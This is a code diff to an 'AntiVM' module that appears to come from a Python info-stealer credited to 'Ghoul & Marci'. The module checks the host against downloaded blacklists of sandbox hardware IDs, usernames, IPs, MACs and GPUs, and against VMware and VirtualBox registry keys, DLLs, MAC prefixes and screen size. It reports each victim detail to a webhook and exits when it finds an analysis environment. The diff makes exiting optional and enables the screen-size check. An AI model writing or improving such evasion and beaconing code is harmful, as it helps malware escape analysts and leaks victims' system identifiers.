@@ -10,21 +10,23 @@ Made With ❤️ By Ghoul & Marci
 """
 
 import ctypes
-import httpx
 import os
 import re
 import sys
 import uuid
+
+import httpx
 
 from ..constants import Lists, UserInfo
 from ..utils.webhook import Webhook
 
 
 class AntiVM:
-    def __init__(self, webhook_url: str, logger) -> None:
+    def __init__(self, webhook_url: str, logger, should_exit: bool) -> None:
         self.webhook_url = webhook_url
         self.logger = logger
         self.webhook = Webhook(self.webhook_url)
+        self.should_exit = should_exit
 
         self.hwidlist = httpx.get(
             "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt"
@@ -61,73 +63,86 @@ class AntiVM:
                 self.webhook.send(
                     f"**Blacklisted HWID Detected. HWID:** `{UserInfo.HWID}`",
                     "Anti VM")
-                os._exit(1)
+                if self.should_exit:
+                    os._exit(1)
         except BaseException:
             self.webhook.send(
                 "[ERROR]: Failed to connect to database.",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         try:
             if UserInfo.USERNAME in self.pcusernamelist.text:
                 self.webhook.send(
                     f"**Blacklisted PC User:** `{UserInfo.USERNAME}`",
                     "Anti VM")
-                os._exit(1)
+                if self.should_exit:
+                    os._exit(1)
         except BaseException:
             self.webhook.send(
                 "[ERROR]: Failed to connect to database.",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         try:
             if UserInfo.PC_NAME in self.pcnamelist.text:
                 self.webhook.send(
                     f"**Blacklisted PC Name:** `{UserInfo.PC_NAME}`", "Anti VM"
                 )
-                os._exit(1)
+                if self.should_exit:
+                    os._exit(1)
         except BaseException:
             self.webhook.send(
                 "[ERROR]: Failed to connect to database.",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         try:
             if UserInfo.IP in self.iplist.text:
                 self.webhook.send(
                     f"**Blacklisted IP:** `{UserInfo.IP}`", "Anti VM")
-                os._exit(1)
+                if self.should_exit:
+                    os._exit(1)
         except BaseException:
             self.webhook.send(
                 "[ERROR]: Failed to connect to database.",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         try:
             if UserInfo.MAC in self.maclist.text:
                 self.webhook.send(
                     f"**Blacklisted MAC:** `{UserInfo.MAC}`", "Anti VM")
-                os._exit(1)
+                if self.should_exit:
+                    os._exit(1)
         except BaseException:
             self.webhook.send(
                 "[ERROR]: Failed to connect to database.",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         try:
             if UserInfo.GPU in self.gpulist.text:
                 self.webhook.send(
                     f"**Blacklisted GPU:** `{UserInfo.GPU}`", "Anti VM")
-                os._exit(1)
+                if self.should_exit:
+                    os._exit(1)
         except BaseException:
             self.webhook.send(
                 "[ERROR]: Failed to connect to database.",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
     def CheckVirtualEnv(self) -> None:
         if self.get_base_prefix_compat() != sys.prefix:
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
     def CheckRegistry(self) -> None:
         reg1 = os.system(
@@ -139,14 +154,16 @@ class AntiVM:
 
         if reg1 != 1 and reg2 != 1:
             self.webhook.send("VMware Registry Detected", "Anti DLL")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
-    def CheckMacAdress(self) -> None:
+    def CheckMacAddress(self) -> None:
         mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
         vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
         if mac_address[:8] in vmware_mac_list:
             self.webhook.send("**VMware MAC Address Detected**", "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
     def CheckScreenSize(self) -> None:
         x = ctypes.windll.user32.GetSystemMetrics(0)
@@ -155,7 +172,8 @@ class AntiVM:
             self.webhook.send(
                 f"Screen Size Is: **x**: {x} | **y**: {y}",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
     def CheckProcessesAndFiles(self) -> None:
         vmware_dll = os.path.join(
@@ -183,19 +201,23 @@ class AntiVM:
             self.webhook.send(
                 "Blacklisted Virtual Machine Process Running",
                 "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         if os.path.exists(vmware_dll):
             self.webhook.send("**Vmware DLL Detected**", "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
         if os.path.exists(virtualbox_dll):
             self.webhook.send("**VirtualBox DLL Detected**", "Anti VM")
-            os._exit(1)
+            if self.should_exit:
+                os._exit(1)
 
     def StartChecks(self) -> None:
         self.CheckVirtualEnv()
         self.CheckRegistry()
-        self.CheckMacAdress()
+        self.CheckMacAddress()
+        self.CheckScreenSize()
         self.CheckProcessesAndFiles()
         self.CheckLists()
